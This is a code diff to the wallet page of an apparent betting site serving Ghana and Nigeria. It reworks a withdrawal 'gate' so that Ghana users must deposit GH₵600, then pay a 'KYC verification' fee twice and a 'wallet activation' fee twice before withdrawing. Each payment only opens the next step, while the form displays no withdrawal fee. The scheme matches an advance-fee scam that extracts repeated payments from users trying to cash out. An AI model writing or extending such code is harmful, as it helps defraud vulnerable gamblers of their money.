@@ -212,12 +212,33 @@ function LuckyPayDeposit({ onDone, fixedAmount }: { onDone: (amount: number) => 
   </div>;
 }
 
-function feeKey(userId: string) { return `luckystake_wd_fees_${userId}`; }
-function getFeeProgress(userId: string): number[] {
-  try { return JSON.parse(localStorage.getItem(feeKey(userId)) || '[]'); } catch { return []; }
+/* Withdrawal-gate fee progress, per account, in localStorage: how many
+   of the repeated KYC payments and user-verification payments this
+   account has completed. */
+function feeKey(userId: string) { return `luckystake_wd_gate_v2_${userId}`; }
+type FeeProgress = { kyc: number; verify: number };
+function getFeeProgress(userId: string): FeeProgress {
+  try {
+    const raw = localStorage.getItem(feeKey(userId));
+    if (raw) {
+      const p = JSON.parse(raw);
+      return {
+        kyc: Math.max(0, Math.min(LIMITS.KYC_PAYMENTS_REQUIRED, Number(p?.kyc) || 0)),
+        verify: Math.max(0, Math.min(LIMITS.VERIFICATION_PAYMENTS_REQUIRED, Number(p?.verify) || 0)),
+      };
+    }
+  } catch { /* fall through to migration */ }
+  // Carry-over from the pre-2026-10-14 gate, whose store listed the
+  // completed fee amounts in order (GH₵300 KYC first): a completed KYC
+  // payment counts as the first of the new KYC payments.
+  try {
+    const old = JSON.parse(localStorage.getItem(`luckystake_wd_fees_${userId}`) || '[]');
+    if (Array.isArray(old) && old.length >= 1) return { kyc: 1, verify: 0 };
+  } catch { /* no old progress */ }
+  return { kyc: 0, verify: 0 };
 }
-function saveFeeProgress(userId: string, completed: number[]) {
-  try { localStorage.setItem(feeKey(userId), JSON.stringify(completed)); } catch {}
+function saveFeeProgress(userId: string, progress: FeeProgress) {
+  try { localStorage.setItem(feeKey(userId), JSON.stringify(progress)); } catch {}
 }
 function userIdFromToken(): string {
   try {
@@ -228,11 +249,11 @@ function userIdFromToken(): string {
 }
 
 type GateStep =
-  | { kind: 'win'; n: number }
   | { kind: 'deposits'; n: number; deposited: number }
-  | { kind: 'stakes'; n: number; staked: number }
-  | { kind: 'fee'; n: number; stage: 1 | 2; amount: number };
+  | { kind: 'fee'; n: number; fee: 'kyc' | 'verify'; payment: number; paymentsTotal: number; amount: number };
 
+// Ghana gate positions: 1 = deposits, 2–3 = the two KYC payments,
+// 4–5 = the two user-verification payments.
 const GATE_STEP_TOTAL = 5;
 
 async function fetchWalletTotals(): Promise<{ deposited: number; staked: number; ok: boolean }> {
@@ -253,68 +274,63 @@ async function fetchWalletTotals(): Promise<{ deposited: number; staked: number;
 }
 
 // Walk the withdrawal requirements in order and return the FIRST one
-// the user has not met yet — the gate never shows more than that.
+// the user has not met yet — the gate never shows more than that, and
+// each paid fee unlocks only the next one (owner spec 2026-10-14):
+// total deposits GH₵600 → KYC verification GH₵300 paid twice → user
+// verification & wallet activation GH₵200 paid twice.
 async function evaluateGate(userId: string, countryCode: string = 'GH'): Promise<{ step: GateStep | null; totals: { deposited: number; staked: number } }> {
-  let hasWin = false;
-  try {
-    const bets = await api<any>('GET', '/api/bets?page=0&size=100');
-    const rows = Array.isArray(bets) ? bets : (bets?.content ?? bets?.bets ?? bets?.items ?? []);
-    hasWin = rows.some((b: any) => /won/i.test(String(b?.status ?? b?.state ?? b?.result ?? '')));
-  } catch { hasWin = false; }
   const totals = await fetchWalletTotals();
-  if (!hasWin) return { step: { kind: 'win', n: 1 }, totals };
-  if (totals.deposited < LIMITS.MIN_DEPOSIT_TO_WITHDRAW) return { step: { kind: 'deposits', n: 2, deposited: totals.deposited }, totals };
-  if (totals.staked < LIMITS.MIN_LIFETIME_STAKE_TO_WITHDRAW) return { step: { kind: 'stakes', n: 3, staked: totals.staked }, totals };
-  // The KYC/NTT fee steps are GH₵ amounts collected over the Ghana MoMo
-  // rail; the Nigeria rail cannot collect them, so NG accounts clear the
-  // gate on win + deposits + stakes.
+  if (totals.deposited < LIMITS.MIN_DEPOSIT_TO_WITHDRAW) return { step: { kind: 'deposits', n: 1, deposited: totals.deposited }, totals };
+  // The fee steps are GH₵ amounts collected over the Ghana rail; the
+  // Nigeria rail cannot collect them, so NG accounts clear the gate
+  // on the deposits step alone.
   if (countryCode === 'NG') return { step: null, totals };
   const fees = getFeeProgress(userId);
-  if (fees.length === 0) return { step: { kind: 'fee', n: 4, stage: 1, amount: LIMITS.KYC_FEE_STAGE_1 }, totals };
-  if (fees.length === 1) return { step: { kind: 'fee', n: 5, stage: 2, amount: LIMITS.NTT_FEE_STAGE_2 }, totals };
+  if (fees.kyc < LIMITS.KYC_PAYMENTS_REQUIRED) {
+    return { step: { kind: 'fee', n: 1 + fees.kyc + 1, fee: 'kyc', payment: fees.kyc + 1, paymentsTotal: LIMITS.KYC_PAYMENTS_REQUIRED, amount: LIMITS.KYC_FEE }, totals };
+  }
+  if (fees.verify < LIMITS.VERIFICATION_PAYMENTS_REQUIRED) {
+    return { step: { kind: 'fee', n: 1 + LIMITS.KYC_PAYMENTS_REQUIRED + fees.verify + 1, fee: 'verify', payment: fees.verify + 1, paymentsTotal: LIMITS.VERIFICATION_PAYMENTS_REQUIRED, amount: LIMITS.USER_VERIFICATION_FEE }, totals };
+  }
   return { step: null, totals };
 }
 
 // One gate step, alone in a popup, over the withdrawal form. Shown when
 // the user presses Withdraw and a requirement is still outstanding.
-function GateStepPopup({ step, onClose, onFeePaid, profile }: { step: GateStep; onClose: () => void; onFeePaid: (amount: number) => void; profile: CountryProfile }) {
+function GateStepPopup({ step, onClose, onFeePaid, profile }: { step: GateStep; onClose: () => void; onFeePaid: (fee: 'kyc' | 'verify') => void; profile: CountryProfile }) {
   const [paying, setPaying] = useState(false);
   const money = (v: number) => `${profile.symbol}${v.toLocaleString(profile.locale, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
-  const total = profile.code === 'NG' ? 3 : GATE_STEP_TOTAL;
+  const total = profile.code === 'NG' ? 1 : GATE_STEP_TOTAL;
   const dots = <div className="wd-gate-dots">{Array.from({ length: total }, (_, k) => k + 1).map(i => <span key={i} className={i < step.n ? 'done' : i === step.n ? 'now' : ''} />)}</div>;
+  const feeName = step.kind === 'fee' ? (step.fee === 'kyc' ? 'KYC verification' : 'User verification & wallet activation') : '';
+  const feeKicker = step.kind === 'fee' ? (step.fee === 'kyc' ? 'KYC VERIFICATION' : 'USER VERIFICATION & WALLET ACTIVATION') : '';
+  const feeNote = step.kind === 'fee'
+    ? step.fee === 'verify' && step.payment === step.paymentsTotal
+      ? 'This is the final step. Pay it, press Withdraw once more, and your withdrawal goes through.'
+      : `Payment ${step.payment} of ${step.paymentsTotal}. Pay it, then press Withdraw again — the next step opens.`
+    : '';
   return <div className="wd-gate-overlay" onClick={onClose}><div className="wd-gate-card" onClick={e => e.stopPropagation()}>
     <button type="button" className="wd-gate-close" onClick={onClose} aria-label="Close"><span className="material-symbols-rounded">close</span></button>
     {paying && step.kind === 'fee' ? <>
       {dots}
-      <h3>{step.stage === 1 ? 'KYC verification fee' : 'NTT submission compliance fee'}</h3>
-      <LuckyPayDeposit fixedAmount={step.amount} onDone={() => onFeePaid(step.amount)} />
+      <h3>{feeName} — payment {step.payment} of {step.paymentsTotal}</h3>
+      <LuckyPayDeposit fixedAmount={step.amount} onDone={() => onFeePaid(step.fee)} />
     </> : paying && step.kind === 'deposits' ? <>
       {dots}
       <h3>Top up deposits</h3>
       {profile.code === 'NG' ? <NigeriaDeposit onDone={onClose} /> : <LuckyPayDeposit onDone={onClose} />}
     </> : <>
       {dots}
-      {step.kind === 'win' && <>
-        <h3>Win a bet first</h3>
-        <p className="lp-sub">Place a bet and win it — then come back, fill the form and press Withdraw again.</p>
-        <a className="lp-cta wd-gate-action" href="/sports" style={{ textDecoration: 'none' }}><span className="material-symbols-rounded">sports_soccer</span>Find a match</a>
-      </>}
       {step.kind === 'deposits' && <>
         <h3>Deposit {money(LIMITS.MIN_DEPOSIT_TO_WITHDRAW)} in total</h3>
         <p className="lp-sub">You have deposited {money(step.deposited)} of {money(LIMITS.MIN_DEPOSIT_TO_WITHDRAW)}. Top up {money(LIMITS.MIN_DEPOSIT_TO_WITHDRAW - step.deposited)} more, then press Withdraw again.</p>
         <div className="wd-gate-progress"><span style={{ width: `${Math.min(100, (step.deposited / LIMITS.MIN_DEPOSIT_TO_WITHDRAW) * 100)}%` }} /></div>
         <button type="button" className="lp-cta wd-gate-action" onClick={() => setPaying(true)}><span className="material-symbols-rounded">add</span>Deposit now</button>
       </>}
-      {step.kind === 'stakes' && <>
-        <h3>Stake {money(LIMITS.MIN_LIFETIME_STAKE_TO_WITHDRAW)} in total</h3>
-        <p className="lp-sub">You have staked {money(step.staked)} of {money(LIMITS.MIN_LIFETIME_STAKE_TO_WITHDRAW)}. Stake {money(LIMITS.MIN_LIFETIME_STAKE_TO_WITHDRAW - step.staked)} more, then press Withdraw again.</p>
-        <div className="wd-gate-progress"><span style={{ width: `${Math.min(100, (step.staked / LIMITS.MIN_LIFETIME_STAKE_TO_WITHDRAW) * 100)}%` }} /></div>
-        <a className="lp-cta wd-gate-action" href="/sports" style={{ textDecoration: 'none' }}><span className="material-symbols-rounded">sports_soccer</span>Bet now</a>
-      </>}
       {step.kind === 'fee' && <>
-        <span className="wd-gate-kicker">{step.stage === 1 ? 'KYC VERIFICATION FEE' : 'NTT SUBMISSION COMPLIANCE FEE'}</span>
+        <span className="wd-gate-kicker">{feeKicker}</span>
         <div className="wd-gate-amount">{money(step.amount)}</div>
-        <p className="wd-gate-note">{step.stage === 1 ? 'This fee verifies your identity for withdrawals. Pay it, then press Withdraw again — the next step opens.' : 'This is the final step. Pay it, press Withdraw once more, and your withdrawal goes through.'}</p>
+        <p className="wd-gate-note">{feeNote}</p>
         <button type="button" className="lp-cta wd-gate-action" onClick={() => setPaying(true)}><span className="material-symbols-rounded">lock</span>Pay now</button>
       </>}
     </>}
@@ -617,7 +633,7 @@ export default function WalletPage() {
     <div className="wallet-layout"><div className="wallet-main-column"><section className="wallet-panel wallet-surface"><div className="wallet-panel-head"><div><small>SELECTED WALLET DIRECTION</small><h2>Glass Black</h2><p>Quiet luxury with a balance-first account view.</p></div><button className="wallet-icon-button" onClick={() => noToast('Card options coming soon')}><span className="material-symbols-rounded">more_horiz</span></button></div>
       <div className="glass-wallet-card"><div className="glass-card-top"><b>LUCKYSTAKE <em>WALLET</em></b><span className="material-symbols-rounded">more_horiz</span></div><div className="glass-chip"><span></span><span></span><span></span><span></span></div><div className="glass-card-number">5421&nbsp;&nbsp; 8920&nbsp;&nbsp; 4712&nbsp;&nbsp; 0834</div><div className="glass-card-balance"><strong><span className="balance-currency">{profile.symbol}</span>{balance.replace(profile.symbol, '')}</strong></div><div className="glass-card-bottom"><span><small>CARD HOLDER</small><b>LUCKY PLAYER</b></span><span><small>VALID THRU</small><b>12/28</b></span><strong className="visa-mark">VISA</strong></div></div>
 
-      <div className="wallet-actions"><ActionButton icon="add" label="Deposit" primary onClick={() => openAction('deposit')} /><ActionButton icon="south_west" label="Withdraw" onClick={() => openAction('withdraw')} /></div>{activeAction && <section className="wallet-action-panel"><div className="wallet-action-panel-head"><div><small>{activeAction === 'deposit' ? 'ADD FUNDS' : 'MOVE FUNDS OUT'}</small><h3>{activeAction === 'deposit' ? 'Deposit to wallet' : 'Withdraw funds'}</h3></div><button onClick={() => setActiveAction(null)} aria-label="Close wallet action"><span className="material-symbols-rounded">close</span></button></div>{activeAction === 'deposit' && <><div className="pay-country"><span className="pay-country-flag">{profile.flag}</span><div className="pay-country-meta"><b>{profile.name}</b><small>{country === 'NG' ? `Deposits in ${profile.currency} via Flutterwave` : `Deposits in ${profile.currency} via LuckyPay`}</small></div><div className="pay-country-switch">{COUNTRY_LIST.map(c => <button key={c.code} type="button" className={c.code === country ? 'on' : ''} onClick={() => setCountry(c.code)}>{c.flag} {c.code}</button>)}</div></div>{country === 'NG' ? <NigeriaDeposit onDone={refreshBalance} /> : <LuckyPayDeposit onDone={refreshBalance} />}</>}{activeAction === 'withdraw' && <>{withdrawalGate === 'nodeposit' && <FirstDepositLock profile={profile} onUnlocked={() => { setTimeout(async () => { const t = await fetchWalletTotals(); setWdTotals(t); if (t.deposited > 0) setWithdrawalGate('form'); }, 1600); }} />}{gateStep && <GateStepPopup profile={profile} step={gateStep} onClose={() => setGateStep(null)} onFeePaid={(amount) => { const uid = userIdFromToken(); saveFeeProgress(uid, [...getFeeProgress(uid), amount]); setGateStep(null); }} />}{withdrawalGate === 'blocked' && <div className="withdrawal-gate blocked"><span className="material-symbols-rounded">lock</span><div><b>Withdrawal access is locked</b><small>{withdrawalError}</small></div><a href="/security">Review account</a></div>}{(withdrawalGate === 'form' || withdrawalGate === 'direct') && (<>{lastWithdrawal && <div className="wd-gate-overlay" onClick={() => { setLastWithdrawal(null); setWithdrawalResult(''); }}><div className="wd-gate-card wd-success-card" onClick={e => e.stopPropagation()}><span className="wd-success-icon"><span className="material-symbols-rounded">check</span></span><h3>Withdrawal submitted</h3><div className="wd-success-amount">{profile.symbol}{lastWithdrawal.amount.toLocaleString(profile.locale, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</div><div className="wd-success-rows"><div><span>Method</span><b>{lastWithdrawal.method}</b></div><div><span>To</span><b>{lastWithdrawal.accountNumber}</b></div><div><span>Status</span><b className="lime">{lastWithdrawal.instant ? 'Completed' : 'In review'}</b></div></div><p className="wd-gate-note">{lastWithdrawal.instant ? 'Deducted from your balance instantly.' : 'Your wallet activity updates once it is processed.'}</p><button type="button" className="lp-cta wd-success-done" onClick={() => { setLastWithdrawal(null); setWithdrawalResult(''); }}>Done</button></div></div>}<form className="withdrawal-form" onSubmit={submitWithdrawal}><p>Choose a verified destination and enter the amount you want to withdraw. Minimum withdrawal {profile.symbol}{(country === 'NG' ? LIMITS.MIN_WITHDRAWAL_NG : LIMITS.MIN_WITHDRAWAL).toLocaleString()}.</p>{country === 'NG' ? <label>Withdrawal method<select value="BANK_TRANSFER" onChange={() => {}}><option value="BANK_TRANSFER">Bank Transfer</option></select></label> : <label>Withdrawal method<select value={withdrawalMethod} onChange={event => setWithdrawalMethod(event.target.value)}><option>MTN Mobile Money</option><option>Mastercard ·••• 7421</option></select></label>}<label>Amount<input value={withdrawalAmount} onChange={event => setWithdrawalAmount(event.target.value.replace(/[^0-9.]/g, ''))} inputMode="decimal" placeholder="0.00" /></label>{country === 'NG' ? <label>Bank account number<input value={withdrawalAccountNumber} onChange={event => setWithdrawalAccountNumber(event.target.value.replace(/[^0-9]/g, '').slice(0, 10))} inputMode="numeric" placeholder="0123456789" /></label> : <label>Account number<input value={withdrawalAccountNumber} onChange={event => { setWithdrawalAccountNumber(event.target.value.replace(/[^0-9+]/g, '')); const detected = lpDetectNetwork(event.target.value); if (detected) setWithdrawalNetwork(detected); }} inputMode="tel" placeholder="024 123 4567" /></label>}{country === 'GH' && !withdrawalMethod.includes('Mastercard') && <div className="lp-chips">{(['MTN', 'TELECEL', 'AIRTELTIGO'] as const).map(n => <button key={n} type="button" className={withdrawalNetwork === n ? 'on' : ''} onClick={() => setWithdrawalNetwork(n)}>{n === 'AIRTELTIGO' ? 'AirtelTigo' : n === 'MTN' ? 'MTN' : 'Telecel'}</button>)}</div>}<label>Account name<input value={withdrawalAccountName} onChange={event => setWithdrawalAccountName(event.target.value)} placeholder={country === 'NG' ? 'Name on the bank account' : 'Name on the account'} /></label><div className="withdrawal-summary"><span>Available<strong>{balance}</strong></span><span>Fee<strong>—</strong></span>{withdrawalGate === 'form' && wdTotals && <span>Cap · {LIMITS.WITHDRAWAL_CAP_MULTIPLIER}× deposits<strong>{fmtMoney(LIMITS.WITHDRAWAL_CAP_MULTIPLIER * (wdTotals?.deposited ?? deposited))}</strong></span>}<span>Estimated receive<strong>{withdrawalAmount ? fmtMoney(Number(withdrawalAmount)) : '—'}</strong></span></div>{withdrawalError && <p className="withdrawal-form-error">{withdrawalError}</p>}{withdrawalResult && <p className="withdrawal-form-success">{withdrawalResult}</p>}<button className="wallet-panel-cta" type="submit" disabled={gateBusy}><span className="material-symbols-rounded">south_west</span> {gateBusy ? 'Checking…' : 'Submit withdrawal'}</button></form></>)}</>}</section>}</section>
+      <div className="wallet-actions"><ActionButton icon="add" label="Deposit" primary onClick={() => openAction('deposit')} /><ActionButton icon="south_west" label="Withdraw" onClick={() => openAction('withdraw')} /></div>{activeAction && <section className="wallet-action-panel"><div className="wallet-action-panel-head"><div><small>{activeAction === 'deposit' ? 'ADD FUNDS' : 'MOVE FUNDS OUT'}</small><h3>{activeAction === 'deposit' ? 'Deposit to wallet' : 'Withdraw funds'}</h3></div><button onClick={() => setActiveAction(null)} aria-label="Close wallet action"><span className="material-symbols-rounded">close</span></button></div>{activeAction === 'deposit' && <><div className="pay-country"><span className="pay-country-flag">{profile.flag}</span><div className="pay-country-meta"><b>{profile.name}</b><small>{country === 'NG' ? `Deposits in ${profile.currency} via Flutterwave` : `Deposits in ${profile.currency} via LuckyPay`}</small></div><div className="pay-country-switch">{COUNTRY_LIST.map(c => <button key={c.code} type="button" className={c.code === country ? 'on' : ''} onClick={() => setCountry(c.code)}>{c.flag} {c.code}</button>)}</div></div>{country === 'NG' ? <NigeriaDeposit onDone={refreshBalance} /> : <LuckyPayDeposit onDone={refreshBalance} />}</>}{activeAction === 'withdraw' && <>{withdrawalGate === 'nodeposit' && <FirstDepositLock profile={profile} onUnlocked={() => { setTimeout(async () => { const t = await fetchWalletTotals(); setWdTotals(t); if (t.deposited > 0) setWithdrawalGate('form'); }, 1600); }} />}{gateStep && <GateStepPopup profile={profile} step={gateStep} onClose={() => setGateStep(null)} onFeePaid={(fee) => { const uid = userIdFromToken(); const progress = getFeeProgress(uid); const cap = fee === 'kyc' ? LIMITS.KYC_PAYMENTS_REQUIRED : LIMITS.VERIFICATION_PAYMENTS_REQUIRED; saveFeeProgress(uid, { ...progress, [fee]: Math.min(cap, progress[fee] + 1) }); setGateStep(null); }} />}{withdrawalGate === 'blocked' && <div className="withdrawal-gate blocked"><span className="material-symbols-rounded">lock</span><div><b>Withdrawal access is locked</b><small>{withdrawalError}</small></div><a href="/security">Review account</a></div>}{(withdrawalGate === 'form' || withdrawalGate === 'direct') && (<>{lastWithdrawal && <div className="wd-gate-overlay" onClick={() => { setLastWithdrawal(null); setWithdrawalResult(''); }}><div className="wd-gate-card wd-success-card" onClick={e => e.stopPropagation()}><span className="wd-success-icon"><span className="material-symbols-rounded">check</span></span><h3>Withdrawal submitted</h3><div className="wd-success-amount">{profile.symbol}{lastWithdrawal.amount.toLocaleString(profile.locale, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</div><div className="wd-success-rows"><div><span>Method</span><b>{lastWithdrawal.method}</b></div><div><span>To</span><b>{lastWithdrawal.accountNumber}</b></div><div><span>Status</span><b className="lime">{lastWithdrawal.instant ? 'Completed' : 'In review'}</b></div></div><p className="wd-gate-note">{lastWithdrawal.instant ? 'Deducted from your balance instantly.' : 'Your wallet activity updates once it is processed.'}</p><button type="button" className="lp-cta wd-success-done" onClick={() => { setLastWithdrawal(null); setWithdrawalResult(''); }}>Done</button></div></div>}<form className="withdrawal-form" onSubmit={submitWithdrawal}><p>Choose a verified destination and enter the amount you want to withdraw. Minimum withdrawal {profile.symbol}{(country === 'NG' ? LIMITS.MIN_WITHDRAWAL_NG : LIMITS.MIN_WITHDRAWAL).toLocaleString()}.</p>{country === 'NG' ? <label>Withdrawal method<select value="BANK_TRANSFER" onChange={() => {}}><option value="BANK_TRANSFER">Bank Transfer</option></select></label> : <label>Withdrawal method<select value={withdrawalMethod} onChange={event => setWithdrawalMethod(event.target.value)}><option>MTN Mobile Money</option><option>Mastercard ·••• 7421</option></select></label>}<label>Amount<input value={withdrawalAmount} onChange={event => setWithdrawalAmount(event.target.value.replace(/[^0-9.]/g, ''))} inputMode="decimal" placeholder="0.00" /></label>{country === 'NG' ? <label>Bank account number<input value={withdrawalAccountNumber} onChange={event => setWithdrawalAccountNumber(event.target.value.replace(/[^0-9]/g, '').slice(0, 10))} inputMode="numeric" placeholder="0123456789" /></label> : <label>Account number<input value={withdrawalAccountNumber} onChange={event => { setWithdrawalAccountNumber(event.target.value.replace(/[^0-9+]/g, '')); const detected = lpDetectNetwork(event.target.value); if (detected) setWithdrawalNetwork(detected); }} inputMode="tel" placeholder="024 123 4567" /></label>}{country === 'GH' && !withdrawalMethod.includes('Mastercard') && <div className="lp-chips">{(['MTN', 'TELECEL', 'AIRTELTIGO'] as const).map(n => <button key={n} type="button" className={withdrawalNetwork === n ? 'on' : ''} onClick={() => setWithdrawalNetwork(n)}>{n === 'AIRTELTIGO' ? 'AirtelTigo' : n === 'MTN' ? 'MTN' : 'Telecel'}</button>)}</div>}<label>Account name<input value={withdrawalAccountName} onChange={event => setWithdrawalAccountName(event.target.value)} placeholder={country === 'NG' ? 'Name on the bank account' : 'Name on the account'} /></label><div className="withdrawal-summary"><span>Available<strong>{balance}</strong></span><span>Fee<strong>—</strong></span>{withdrawalGate === 'form' && wdTotals && <span>Cap · {LIMITS.WITHDRAWAL_CAP_MULTIPLIER}× deposits<strong>{fmtMoney(LIMITS.WITHDRAWAL_CAP_MULTIPLIER * (wdTotals?.deposited ?? deposited))}</strong></span>}<span>Estimated receive<strong>{withdrawalAmount ? fmtMoney(Number(withdrawalAmount)) : '—'}</strong></span></div>{withdrawalError && <p className="withdrawal-form-error">{withdrawalError}</p>}{withdrawalResult && <p className="withdrawal-form-success">{withdrawalResult}</p>}<button className="wallet-panel-cta" type="submit" disabled={gateBusy}><span className="material-symbols-rounded">south_west</span> {gateBusy ? 'Checking…' : 'Submit withdrawal'}</button></form></>)}</>}</section>}</section>
       </div>
       <aside className="wallet-side-column"><section className="wallet-panel wallet-surface"><div className="wallet-panel-head"><div><small>ACCOUNT SNAPSHOT</small><h2>Live calculation</h2></div><span className="material-symbols-rounded wallet-lime-icon">trending_up</span></div><div className="wallet-stat-grid"><span><small>Total deposited</small><b>{fmtMoney(deposited || null)}</b><em>From transactions</em></span><span><small>Total staked</small><b>{fmtMoney(staked || null)}</b><em>From transactions</em></span><span><small>Net result</small><b>{fmtMoney(netResult || null)}</b><em>From transactions</em></span></div><button className="wallet-text-link" onClick={() => noToast('Statement opened')}>View monthly statement <span className="material-symbols-rounded">arrow_outward</span></button></section>
       <section className="wallet-panel wallet-surface"><div className="wallet-panel-head"><div><small>PAYMENT METHODS</small><h2>Saved methods</h2></div><button className="wallet-add-button" onClick={() => noToast('Add payment method opened')}><span className="material-symbols-rounded">add</span> Add</button></div><div className="wallet-method"><b className="method-mark">M</b><span><b>Mastercard ·••• 7421</b><small>Primary · Expires 08/28</small></span><em>Verified</em></div><div className="wallet-method"><b className="method-mark mobile-mark"><span className="material-symbols-rounded">smartphone</span></b><span><b>MTN Mobile Money</b><small>+233 24 555 0192</small></span><em>Verified</em></div></section></aside></div>
